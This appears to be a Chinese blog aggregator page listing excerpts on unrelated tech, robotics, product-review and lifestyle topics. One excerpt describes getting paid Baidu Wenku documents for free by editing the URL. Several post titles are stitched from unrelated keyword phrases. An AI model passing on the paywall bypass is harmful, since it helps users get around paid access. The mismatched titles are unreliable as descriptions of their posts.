新思界产业分析人士表示,SCARA机器人当前主要应用在3C领域,随着5G技术的发展,3C产业快速发展,进而带动SCARA机器人需求攀升,SCARA机器人行业前景较好。在生产方面,当前我国SCARA机器人进口依赖较强,但在政策的扶持下,我国SCARA机器人与进口产品不断缩小差距,未来国产SCARA机器人市场占比不断提升,预计到2025年国产化率或将达到75%左右。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/16bdfb9f8dd170c2a18628930e5f6cb3/" rel="bookmark">
			万能命令免费下载百度文库任意文档
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用到的工具就是三个字母“vvv”，使用这三个字母就可以免费下载百度文库需要VIP才能下载的文档。
在百度文库找打开你需要下载文档的页面，然后再文档页面的网址域名后面加上 vvv 三个字母，就可以快捷下载。
选择你需要导出文档的格式，word或者PDF，选择之后点击下载即可，会自动调用你浏览器下载工具进行下载。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac6f9227b9a5431eac0bf1566164a0d2/" rel="bookmark">
			abb机器人示教器io信号关联_ABB机器人 | 系统输入/输出与I/O信号的关联、示教器可编程按键的使用第三期...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天我们来学习新的知识，第三期教你学会系统输入/输出与I/O信号的关联，掌握示教器可编程按键的使用方法及安全保护机制的设置的使用。
智能方在线学院&amp;助力提高您的技术能力
您身边的机器人服务专家
第3期(目录)
1、学会系统输入/输出的使用
2、学会示教器可编程按键的使用
3、安全控制回路的设置
4、系统输入/输出与I/O信号的关联
5、示教器可编程按键的使用
6、安全保护机制的设置
1.系统输入/输出与I/O信号的关联
将数字输入信号与系统的控制信号关联起来，就可以对系统进行控制(例如电机开启、程序启动等)系统的状态信号也可以与数字输出信号关联起来，将系统的状态输出给外围设备，以作控制之用。
2.示教器可编程按键的使用
3.安全保护机制的设置
标准柜安全保护机制电气原理图(一)如下：
标准柜安全保护机制电气原理图(二)
标准柜安全保护机制电气原理图(三)
紧凑柜安全保护机制电气原理图(一)
紧凑柜安全保护机制电气原理图(二)
⇊ 往期回顾 ⇊
ABB机器人 Profinet 从站配置(888-3)
ABB机器人 CC Link 通讯设定(DSQC378B)
ABB工业机器人单独导入程序方法和步骤 | 创建信号及关联信号步骤
ABB 机器人DeviceNet通讯总线&amp;《外围设备通讯》
ABB 机器人 Devicenet 主从站设置
ABB 机器人 | 输送链跟踪配置和编程步骤
ABB | 电机装置和齿轮装置(安装电机)
ABB 机器人 I/O通讯与配置实操应用技巧《第一期》
ABB 机器人 I/O信号监控与操作 Profibus与Profinet适配器的连接配置《第二期》
ABB 1410 | 机器人零点计数器更新(同步标记与轴同步位置)
ABB IRC5 Compact及IO配置介绍
ABB机器人 | 安装 I/O 装置
ABB机器人(新)I/O DSQC1030配置
全球工业机器人品牌经销商
品牌推广服务商 智能方 品牌合作
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ac6f9227b9a5431eac0bf1566164a0d2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/42b927a10efa64778337dd9799ebe781/" rel="bookmark">
			python apischeduler 每天下午3点到5点_爱吃生蚝 温村这5家$1刀多大生蚝！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		(加西网综合)随着温哥华日长越来越多的阳光 ，海鲜吃货又开始惦念品尝丰沛多汁、柔软鲜甜的生蚝了。温哥华作为品尝生蚝的最好城市，最近几家餐厅都在其“欢乐时光”井段提供便宜美味的生蚝。以下就是温哥华5个餐厅，一个生蚝才一刀多！Chewies Coal Harbour 周一至周日下午3点至6点以及周日至周四晚上9点至深夜，提供欢乐时光和Buck-A-Shuck(每人最多6个生蚝)。 Chewies Kitsilano的欢乐时光为周一至周五下午5点至7点，周六和周日下午3点至7点，周日至周四晚上9点至深夜。地址: 1055 W Hastings Street, Vancouver电话: 604-620-7634地址: 2201 W 1st Avenue, Vancouver电话: 604-558-4448 Fanny Bay的欢乐时光每天下午3点至6点开放，为顾客提供生蚝，每个1.50元，以及其他食物 。地点: 762 Cambie Street, Vancouver电话: 778-379-9510 食客可以在Joe Fortes每天4点到6点的欢乐时光享用1.25元一个的生蚝(仅限酒吧)(不接受预订)。 地址: 777 Thurlow Street, Vancouver电话: 604-669-1940 生蚝粉们可以在周一至周六下午3点到10点以1.50元的价格品尝生蚝。 。地址: 1228 Hamilton Street电话: 604-609-0080地址: 52 Powell Street, Vancouver电话: 604-685-2005餐厅每天由下午4点到6点的欢乐时光，以及晚上10点关门，提供2元一个生蚝，也可以3元品尝一只优质生蚝。 地址: 1210 Denman St Vancouver电话: 604-620-4668
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4c5cee2b9cd8d3a0c31430c2ae522e93/" rel="bookmark">
			连接端口 配置hive_MaxCompute还能这么玩系列（2）—— 实现MaxCompute与Hive生态工具的互通...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注：MaxCompute原名ODPS，是阿里云自研的大数据计算平台，文中出现的MaxCompute与ODPS都指代同一平台，不做区分
什么是Hive
Hive是一款经典的hadoop技术栈的数仓软件，可以让用户采用SQL来完成大数据量的计算分析。如果你对Hive还不熟悉，请移步Apache Hive官网获取进一步了解。MaxCompute在很多功能上与Hive相近，所以大部分MaxCompute的用户曾经也是Hive的用户。 什么是HiveServer2
既然提到HiveServer2，那得先介绍一下HiveServer1，我们通常也直接称之为HiveServer。HiveServer是基于Apache Thrift构建的一套服务，它支持远程客户端通过Thrift API向Hive提交请求。由于HiveServer1无法处理超过一个以上客户端的并发请求，所以社区对HiveServer1进行了重写，从而解决了HiveServer1中存在的诸多问题，该重写后的新版本我们称之HiveServer2。 由于HiveServer2本质上是一个Thrift Server，所以天然拥有跨语言的支持，而大量的Hive生态的工具也是基于HiveServer2的Thrift API实现的，比如最常见的Hive ODBC和Hive JDBC，以及基于这两套实现之上的其他工具。 什么是HiveServer2 Proxy
顾名思义，HiveServer2 Proxy是一个代理，它是在原有HiveServer2的基础之上定制开发后得到的。它完成的工作就是接受客户端提交的的Thrift请求，将其反序列化并转换成MaxCompute能够识别的请求，然后提交给MaxCompute处理，并在MaxCompute处理完后将响应再次转换成客户端能够识别的符合Hive接口规范的Thrift响应，从而实现Hive生态工具到MaxCompute的互通。简而言之，它的功能就是在用户无需修改Hive生态工具的情况下，为这些工具与MaxCompute的交互提供了一条通路，从而使我们能在复用已有的Hive工具的同时，也能使用上MaxCompute强大的计算引擎。 HiveServer2 Proxy的原理图如下所示： 下面我们将通过两个实例来演示HiveServer2 Proxy的功效。
部署HiveServer2 Proxy
首先，部署HiveServer2 Proxy的前置条件是安装好Java1.7和hadoop2.x（如果你不想安装hadoop也可以跳过这一步），此处不做赘述，请参考这两者的官方文档。笔者在以下内容中将以MacBook PRO的OS X来作为演示系统。其他操作系统的用户在配置上大同小异。 确保前置条件满足后，请下载HiveServer2 Proxy的测试版。 将下载到的压缩包解压，得到名为apache-hive-2.1.0-odps-proxy的文件夹。设置好HIVE_HOME环境变量，如笔者的配置： emerson@192.168.31.104 /Users/emerson/apache-hive-2.1.0-odps-proxy % export HIVE_HOME=$(pwd) emerson@192.168.31.104 /Users/emerson/apache-hive-2.1.0-odps-proxy % echo $HIVE_HOME /Users/emerson/apache-hive-2.1.0-odps-proxy 如果你安装了hadoop请配置环境变量HADOOP_HOME，如果跳过没有安装的，可以使用proxy自带的hadoop依赖，即根目录下的hadoop目录。可以在根目录下执行如下命令： emerson@192.168.31.104 /Users/emerson/apache-hive-2.1.0-odps-proxy % export HADOOP_HOME=$(pwd)/hadoop 完成环境变量的配置之后进入根目录下的conf文件夹，修改hive-site.xml中的相关配置项，样例如下所示，其中每一项的说明已在description标签中有所描述： &lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt; &lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?&gt; &lt;configuration&gt; &lt;property&gt; &lt;name&gt;hive.execution.engine&lt;/name&gt; &lt;value&gt;odps&lt;/value&gt; &lt;description&gt;hive执行引擎，此处默认是odps，不需要修改&lt;/description&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hive.session.impl.classname&lt;/name&gt; &lt;value&gt;org.apache.hive.service.cli.session.HiveSessionOdpsImpl&lt;/value&gt; &lt;description&gt;HiveSession的的odps plugin实现，不需要修改&lt;/description&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;odps.accessid&lt;/name&gt; &lt;value&gt;abcdefg&lt;/value&gt; &lt;description&gt;请修改成你的accessid&lt;/description&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;odps.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4c5cee2b9cd8d3a0c31430c2ae522e93/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bf30e37297aae40158e12c8ae25f6081/" rel="bookmark">
			解决Adobe reader闪退问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一. 打开防火墙的高级设置 先打开控制面板, 然后打开防火墙, 点高级设置, 需要添加两条出站规则
二. 添加出站规则 规则名称自己定义, 程序路径写自己的安装路径, 两个规则对应两个路径, 我这边分别是:
D:\Adobe\Reader 11.0\Reader\AcroRd32.exe
D:\Adobe\Reader 11.0\Reader\AcroRdbat.exe
添加过程不再截图, 傻瓜式添加…
三. 注意 有的人只定义其中之一就不会闪退了, 但是我这边试了一下, 单独定义哪一个都不行, 必须定义两个.
如果还是没有解决, 那就修改一下host文件.
修改方法: 找到C:\Windows\System32\drivers\etc\hosts
添加: 127.0.0.1 acroipm.adobe.com
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1b2fb0f4b099cc34cd28cd02fc38ff9/" rel="bookmark">
			论文解读：（TransH）Knowledge Graph Embedding by Translating on Hyperplanes
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转自： https://blog.csdn.net/qq_36426650/article/details/103336589?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control
论文解读：（TransH）Knowledge Graph Embedding by Translating on Hyperplanes TransE是一种经典的知识表示学习方法，其通过对头实体、尾实体及对应关系进行建模，设计 d ( h + l − t ) d(h+l-t)d(h+l−t) 的能量函数，并运用负采样和随机梯度下降的方法对待训练的向量进行调整，从而能够得到不错的低维向量。TransE模型在链接预测上达到的最优，对知识补充起到了最好的效果。
然而TransE模型结构非常简单，虽然可以在大量数据的条件下可以快速有效的进行训练，但由于模型过于简单，并不能够很好的表征实体对之间的语义关系。另外对于处理复杂关系数据（一对多、多对一和多对多）时，过于简单的假设可能导致错误的表征。例如对于一对多情况，即同一个头实体 h hh 和关系 l ll 可能对应多个尾实体 h 1 , h 2 , . . . h_1,h_2,...h1​,h2​,...，所以TransE模型训练后的结果是 h 1 ≈ h 2 ≈ . . . h_1\approx h_2 \approx ...h1​≈h2​≈...，这很明显是错误的。因此需要对其进行改进。TransH就是对TransE模型的改进。
一、简要信息 序号属性值1模型名称TransH2所属领域自然语言处理3研究内容知识表示4核心内容knowledge embedding5GitHub源码https://github.com/thunlp/KB2E6论文PDFhttp://pdfs.semanticscholar.org/2a3f/862199883ceff5e3c74126f0c80770653e05.pdf) 二、摘要与引言 我们将大规模的知识图谱中的实体和关系嵌入到连续的向量空间中。TransE是最近提出的一种方法，它非常有效，同时可以获得最优的预测效果。我们讨论了许多关系映射的属性需要考虑被嵌入，包括自反性、一对多、多对一和多对多。我们指出TransE模型不能够处理这些特性。一些复杂的模型可以有效的保存这些映射属性，但需要牺牲一定的效率。为了能够在能力和效率之间保持平衡，本文我们提出TransH模型，其可以构建关系的超平面并执行翻译操作。这样我们可以很好的保存上面提到的关系映射特性，且模型复杂度与TransE相似。另外作为一种实用的知识图谱，往往是不完整的。在训练过程中如何构建负样本对于降低错误标签是非常重要的。利用一对多或多对一的关系映射属性，我们提出一种简单的策略来价格低错误标签的可能性。我们执行了额外的实验包括链接预测、三元组分类和知识抽取在标准数据集上，例如WordNet和FreeBase。实验表明，与TransE相比，TransH在预测精度方面有了显著的改进，并具有可比较的扩展能力。
知识图谱是一种多元的图，其包含一些实体（结点）和关系（不同类型的边）组成。一个边的示例代表一个事实，包含头实体、关系和尾实体，通常表示为 ( h , l , t ) (h,l,t)(h,l,t) 。构建知识图谱在过去有了很大的突破，但依然存在两个挑战：
（1）知识图谱是一种由符号和逻辑组成的系统，基于此的一些应用涉及到连续空间内大规模的计算；
（2）很难把全局信息聚集在图中。
传统 的方法是基于形式化逻辑推理的方法，但处理长范围的推理显得不那么容易处理，健壮性变低。最近一种新的方法被提出来处理这些问题，即将知识图谱嵌入在连续的空间中。方法是将头尾实体表示为空间中的点（即是坐标原点到这个点的向量），关系边表示为两个点之间的映射属性，通过最小化一个全局损失函数来训练这三个向量。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c1b2fb0f4b099cc34cd28cd02fc38ff9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/52a4250f74ec97654248e36dd98c0e75/" rel="bookmark">
			Kotlin的协程 是什么？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		看完 扔物线 讲的关于Kotlin的协程，自己做一下自我总结。
Kotlin的协程是什么？
它是在java线程基础上封装一种线程调用的框架，它本质上还是跑在线程上的。
它是为了方便我们不用写过多的代码去关注或实现线程的切换的事情。
举个例子，在Android上，子线程不能更新UI，而网络请求又不能在主线程进行。
假定有一个场景，点击按钮后，从服务端把文字请求下来，并展现在TextView上，
一般我们用java的时候是这么写的：
{ // ... ... btn.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { Log.i(TAG,"click..."); new Thread(new Runnable() { @Override public void run() { final String text = getFromServer(); Log.i(TAG,"get end..."); runOnUiThread(new Runnable() { @Override public void run() { textView.setText(text); } }); } }).start(); } }); } private String getFromServer(){ //todo 网络请求 return text; } 当然，你也可以稍微有点高级的写法，比如，使用线程池，使用Future，Handler等等写法，本质上都需要创建一个线程，并在线程获得结果后再切到主线程更新TextView。
但是，如果使用Kotlin，就可以这么写：
btn.setOnClickListener { GlobalScope.launch(Dispatchers.Main) { var fromServer = getFromServer() Log.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/52a4250f74ec97654248e36dd98c0e75/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c37f2e8b37e9c1523943c846c029b7f9/" rel="bookmark">
			av功放直通模式_天龙 Denon发布全球首款支持8K的家庭影院功放长这样
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		天龙 Denon推出了2020年最新一代的X系列家庭影院功放。
今年发布的有四种新型号，每种都替换了去年的型号。天龙 Denon AVC-X6700H（￡2299 / $ 2499，7月，如图所示），AVC-X4700H（￡1399 / $ 1699，7月），AVC-X3700H（￡999 / $ 1199，8月）和AVR-X2700H（￡599 / $ 849） ）分别是屡获殊荣的AVC-X6500H，五星级AVR-X4500H，年度最佳产品AVR-X3600H和五星级AVR-X2600H！因此新用户有大的选择范围。
支持8K直通（及其他所有功能）
（图片来源：天龙 Denon）
就像文章标题所说：这是即将发布的首批支持8K的家庭影院功放
每个功放的支持8K的HDMI输入可实现8K / 60Hz和4K / 120Hz的视频直通（也可以将高清素材放大到8K），并播放HDR格式，包括HDR10 +和动态HDR（除了HDR10，Dolby Vision和HLG之外） ）。它们还支持一种称为快速媒体切换（QMS）的新HDMI功能，该功能允许信号源立即切换分辨率或帧速率以消除屏幕中断。
这些新的天龙 Denon AV功放自然会覆盖最新的环绕声格式。11通道AVC-X6700H和9通道AVC-X4700H开箱即用的支持Dolby Atmos，Dolby Atmos高度虚拟化技术，DTS：X，DTS Virtual：X和Auro-3D，而6700将于今年晚些时候推出，它还支持DTS：X Pro，它最多可以使用扬声器配置（例如7.2.6或9.2.4）进行DTS：X解码的13个通道。 这两个功放以及9通道AVC-X3700H都可以解码IMAX增强音轨。除AirPlay 2和蓝牙外，HEOS多房间流媒体平台是内置的，可直接访问流媒体服务，包括Spotify，Tidal，Amazon Music HD和Deezer。借助Roon Tested认证，2020 X系列AVR也可以集成到Roon设置中。
为游戏玩家提供了可变刷新率（以减少波动率），自动低延迟模式（自动切换到“游戏模式”以减少输入延迟）和快速帧传输（以减少显示延迟）的支持。
（图片来源：天龙 Denon）
入门级7通道AVR-X2700H支持Audyssey MultEQ XT室内EQ校准技术，其余产品支持高级Audyssey MultEQ XT32软件，还有subEQ HT用于独立的低音炮校准，有望实现更加平衡和可控的低音性能。新的预设Audyssey记忆模式允许所有者存储两个Audyssey配置，并且也可以在它们之间即时切换。
最后不得不提的是：天龙 Denon将其``前置功放''模式从2019年的旗舰AVC-X8500H降低到了新的AVC-X3700H，AVC-X4700H和AVC-X6700H。当接收器用作AV处理器且所有扬声器均由外部功放供电时，前置功放模式通过断开内部功放的连接来提供更大的削波容限。有没有很期待的想要试用新的天龙 Denon AVR？，据最新消息他们的第一批新款型号将在7月份发布，希望不会让我们等很久吧！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bfe905add353403da237a949808bda84/" rel="bookmark">
			a上标3下标6算法_MSCKF那些事（四）算法详解2：数学基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 数学定义
后续将进行MSCKF数学基础介绍，先总结一下数据符号定义。
坐标系定义 { }：世界坐标系，地面(ground)系，有的论文也写作{ }世界(world)系，通常定义为算法初始化时刻的机器人的“前右下”坐标系或者“北东地”坐标系。 { }：IMU坐标系，IMU加速度计、角速度计的测量坐标系。 { }：Body系，通常是机器人”前右下”坐标系，MSCKF中通常将{ }系定义为{ }系。 { }：Camera系，因为有历史多个相机状态，所以通常有下标{ }表示第i个。 物理量定义 ：单位四元数，表示A系到B系的旋转，长度为4 ：旋转的误差量表示，所以通常会带波浪号上标，长度为3 ：A坐标系下B的速度 ：A坐标系下B的位置 ：加速机和陀螺仪的bias 估计量定义： 表示误差值， 表示估计值， 没有上标表示真实值。 传感器观测量用右下标m表示： ，分别表示从加速度计和陀螺仪获得的测量加速度和测量角速度 四元数定义：四元数有Hamilton和JPL两种形式，不同论文定义不一致，后面统一使用的JPL形式，区别如下 两种形式的四元数对比 旋转的表示： 表示四元数， 表示旋转矩阵， 表示旋转误差量，有时也写成 。 和 之间的相互转换可以参见wiki, 为反对称矩阵。 量的左乘与右乘：对于一个旋转矩阵 ，其误差量 ，则左乘定义为 , 右乘定义为 。不同论文的定义不一样，所以可能推导出的Jacobian也不一样。 后面统一使用左乘定义。 2. 误差状态向量 MSCKF后端的融合框架用的error-state EKF，其状态向量包括：IMU状态和N个历史相机状态，误差状态向量如下：
这里波浪号代表误差量，除了旋转量以外，其他误差项都是直接相加(真实值=估计值+误差值)，旋转量的误差项的叠加方式为：
由于 的维度为4， 的维度为3，所以状态向量 长度为16，而误差状态向量 的长度为15。 时刻的完整状态向量 如下，维度为 ， 为相机个数： 状态协方差矩阵为：
其中 是 的IMU状态对应协方差， 是 的相机状态对应的协方差， 是IMU状态与相机状态之间的关联协方差。 注意：这里的只讨论了最基本的15维IMU状态，很多论文为了获得更高的精度，会将状态向量扩展到更高维，如将相机内外参、时间同步误差等状态量加入到状态向量中，在后续篇章中会进行单独介绍。
3. Error-State EKF 先回顾EKF(Extendec Kalman Filter)：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bfe905add353403da237a949808bda84/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5bc235123daf454ce9d60de1237bd905/" rel="bookmark">
			个人投资课 张潇雨_最重要的事情只有一件（张潇雨语录）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		中午刷得到，突然看到张潇雨老师的一段话，觉得很有道理立刻转发到了朋友圈。
想完成一件重要的事，最关键的环节不是什么设立远大目标、学习高效方法或者坚定自身意志，而是把这件事放在一个无可辩驳的最高优先级上。
而其他所有事，不管听起来多么正确合理、多么理所应当，都要彻底围绕着这件事来运行，都要进行不可妥协的让步，都要摒弃与自我反复的讨价还价。只有做出这种程度的舍弃与牺牲，重要的结果才是有可能到来的。
之前以为自己没做到，是因为没有得到要领，现在突然明白原来，事事都不把它放在第1位，不付出精力，怎么可能得到结果呢？
张潇雨老师是得到课程《商业经典案例课》《个人投资课》的主理人，他的课程我还没有订阅，赶紧又上得到关注他的更多动态，没想到看到好多金句，现在一一摘录出来。
1. 想要跌的时候不太痛苦，最好涨的时候别太高兴。
2. 和朋友说：你把时间花在并不那么享受的社交上的作用就是，这样就不用面对自己的生活和自己了。
3. 做不到可以有一万个理由解释为什么做不到，做得到大概只有一个理由，就是想做到。
4. 想要认识其他领域里最好的人，最简单的方法就是把自己领域的事情做到最好那个等级。
5. 尽早建立「不管什么人其实都差不多」的情感体验和身体感受——而非理性认知——会对自身生活满意度有巨大的帮助。
6. 回看这几年我做失败的个人计划和项目，大多都是那些我刚进行了一点努力就要求看到回报的。
7. 有时候我觉得讨厌自己的人还不够多，这可能显示着我在做的事情还不够关键和重要。
8. 昨天和朋友说：先看看自己手里有什么资源，然后去想利用这些资源能达到什么样的目标，和先设定好最终的目标，然后反推自己应该去获得什么样的资源，是两种完全不同的做事方式。
9. 很多人都觉得，当看到自己曾经写的说的东西感觉特别幼稚，是一种自我成长了的表现。可惜很多时候并不是。
我们会说出那些如今看起来尴尬的事，是因为在那一刻我们的虚荣、贪婪、嫉妒、懒惰、傲慢与无明起了作用，而不是因为别的什么。而如今虽然说的内容变化了，看起来更高级了，但它们不过是这些虚荣、贪婪、嫉妒、懒惰、傲慢与无明的另一种表现形式罢了。从这个意义上讲，衡量自我成长的标准到底是什么，其实值得好好想一想。
10. 当他人对你产生期望而你没有达到的时候，是他们预测失败了，而不是你执行失败了。
11. 据我的有限观察，仅就做事上来说，大量大量的人都是 70 分水平的，这让那些 80 分水平的人显得格外出色。而人生至此我认为成功的秘诀就是——反复克制住想和 80 分人合作的冲动，花上足够的精力和耐心，坚持只和那些 90 和 95 分的人一起做事——并且在这个过程中，把自己变成一个配得上他们的人。
12. 今天和朋友聊天时说到的：在几乎任何领域里，顶级玩家与优秀玩家水平之间的差距，其实比优秀玩家与平庸玩家之间水平的差距还要大，而且大得多。
13. 想了想这些年来我做过的最浪费时间的事：
1. 开一个不需要发言的会；
2. 非要看完一本不值得的书；
3. 持续犹豫去玩还是把一件小事做了；
4.. 不敢离开一个给自己带来痛苦的工作；
5. 一直等人回我的微信；
6. 强行熬夜导致第二天精神不佳；
7. 试图改变别人的想法；
8. 在一段关系里为了避免冲突而不去直接解决问题；
9. 期待别人给我答案而不是自己去做调研；
10. 以消耗自己的代价取悦他人；
11. 为一个很难计划清楚的目标准备过久；
12. 制造一个并不存在的问题并试图解决它。
14. 决定一个人成就高低的往往不是每次比赛赢了还是输了，而是把自己放置在哪个层级竞争。
15. 想一想，有些时候我们希望把自己做的东西弄到最完美才愿意拿出来，不是因为我们的自尊心太高了，而是因为自尊心太低了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5bc235123daf454ce9d60de1237bd905/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f992ebd58ae16af08027848f467bcdd/" rel="bookmark">
			华为阅读电子书存在哪_华为nova7 SE评测：年轻人的高颜值5G潮美新机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		[PConline评测]提起华为nova系列，我们的第一印象往往是出众的颜值与过硬的拍照能力。我们知道，华为nova系列就是专为Z世代年轻人定制的潮美手机。在5G网络即将普及的2020年，华为nova系列的最新之作，高颜值5G双模手机nova7 SE 正式亮相。那么，nova7 SE 究竟有哪些亮点呢？就让我们一起来看一看吧。
高颜值ID设计，一见倾心
对nova系列而言，美始终是第一要义。nova7 SE继承了nova系列对美的追求，带来四种优雅灵动的全新配色。无论是利用渐变色设计，在张扬与内敛间找到完美平衡点的银月星辉，还是空灵寂静，极具视觉深度的绮境森林，亦或是神秘浪漫的仲夏紫与经典的幻夜黑，选项众多，总能找到一款你喜欢的存在。
值得一提的是，nova7 SE机身背部采用3D玻璃背板设计，配合8.58mm厚，189克的轻薄机身，大幅提高了整机的握持体验。
转到机身正面，nova7 SE 搭载一块比例为20:9的6.5英寸LCD极点全面屏，分辨率为2400*1080，NTSC色域为96%，PPI达到405。
由于采用更为成熟的盲孔技术，使得nova7 SE 的屏占比达到了90.3%，视觉冲击力极强。配合出众的屏幕显示效果，观看视频时能够带来堪称享受的视觉效果。
nova7 SE采用侧面实体指纹解锁按键，解锁、电源按键二合一，更符合人体工程学设计。实测显示，nova7 SE解锁时间仅0.25s，解锁成功率高达98%，真正做到了极速解锁，一触即开。
6400万像素AI四摄，表现全能
nova7 SE搭载后置6400万像素AI四摄，由6400万像素主摄+800万像素超广角镜头+200万像素景深镜头+200万像素微距镜头组成。
6400万像素主摄配备6P镜头，F1.8大光圈、0.8μm单像素面积，相较上一代产品感光面积提高34%。不仅支持直出6400万像素高清样张，同时支持像素四合一输出1600万像素样张。在不同的亮度环境下，nova7 SE依旧能获得十分优秀的拍摄样张。
800万像素120°超广角镜头的取景面积相较主摄扩大2.4倍，更适合大场景风景，多人合拍等拍摄场景。
视频录制方面，nova7 SE 支持4K高清视频录制，并提供960fps超级慢动作视频以及延时摄影等功能，可玩性十足，为Vlogger们提供有趣的视频表现手法。
nova7 SE前置摄像头拍摄
前置摄像头方面，nova7 SE搭载有1600万像素自拍镜头，支持立体美颜与局部优化功能。兼顾了清晰度和美颜效果，实现自然靓丽的自拍表现。
nova7 SE前置摄像头拍摄
人像超级夜景技术也没有缺席，结合单反级BM3D算法实现人景分离。即使在光线昏暗的夜晚自拍，也能清晰呈现出脸部细腻的妆容与环境背景细节，真正做到了人美景也美。
麒麟820 5G SoC，出众5G体验
nova7 SE搭载新一代5G神U麒麟820 5G SoC，采用7nm制程工艺，1*A76超大核+3*A76大核+4*A55小核的CPU架构，并搭载全新Mali-G57 GPU，能够输出更强的性能。配合华为自研的新一代GPU Turbo，运行《王者荣耀》、《和平精英》等主流游戏时，能够高清满帧运行。
NPU方面，麒麟820 5G SoC搭载有华为自研架构NPU，benchmarkETH跑分相比麒麟810提升73%，能为影像拍摄、游戏娱乐等提供更高的AI算力，带来更为出色的智能体验。
至于5G性能，麒麟820 5G SoC不仅支持SA/NSA双模5G，更支持五个5G频段，覆盖更全面，保证用户能够随时随地连接到5G网络，使用500Mbps的联通卡进行测试，在室内环境下可以跑满限速。此外，麒麟820 5G SoC首发华为SUL超级上行技术，能够有效提升上行覆盖范围与速率，带来更好的5G体验。
4000mAh大电池+40W华为超级快充提供持久的续航表现以及快速的充电能力，从电量耗尽开始实测，30分钟可以充入73%电量，约1小时可以充满手机。
EMUI10.1，智慧好用
nova7 SE搭载最新的EMUI10.1系统，带来多项实用功能。全新的电子书模式，借助单独的电子书模式自动亮度曲线，通过彩色转黑白及黑色灰度调整，舒适双眼，轻松阅读。
全新的游戏助手支持防误触、智能亮度锁定以及游戏画中画功能，最大程度避免我们游戏过程中受到外界干扰，让我们尽情享受游戏的快乐。
nova7 SE 同样内置华为畅连APP，借助分布式技术革新现有视频通话模式，一举带来跨终端高清流畅的音频视频通话体验。即使在网络环境不好时，借助超分技术实时补偿视频画质，自适应宽带变化，依旧能带来高清流畅的视频通话体验。
总结
作为年轻人的高颜值5G双模潮美新机，nova7 SE 完美诠释了nova系列“创新、时尚、个性、好玩”的核心设计理念。如果你是追求时尚的年轻潮人，那这部nova7 SE无疑是你的最佳选择。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f23daa3cca7a7705f1a75f4f9e8860a7/" rel="bookmark">
			IDEA登录Git无法登陆提示401
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		IDEA登录Git无法登陆提示401 如果使用账号密码登陆提示401，那就申请一个令牌访问连接
登录GitHub，点击右上角头像Settings
接着点击Developer settions
点击Personal access tokens
Personal access tokens ,New personal access token
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/475e55486ff555867040c3e664bec2dc/" rel="bookmark">
			9原理图隐藏位号设置_听说你还不会丝印位号的调整？不妨看看这篇！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 丝印位号的调整
针对后期元件装配，特别是手工装配元件，一般都得出PCB的装配图，用于元件放料定位之用，这时丝印位号就显示出其必要性了。 生产时PCB上丝印位号可以进行显示或者隐藏，但是不影响装配图的输出。按快捷键“L”，按所有图层关闭按钮，即关闭所有层，再单独勾选只打开丝印层及相对应的阻焊层，即可对丝印进行调整了。 丝印位号调整的原则及常规推荐尺寸
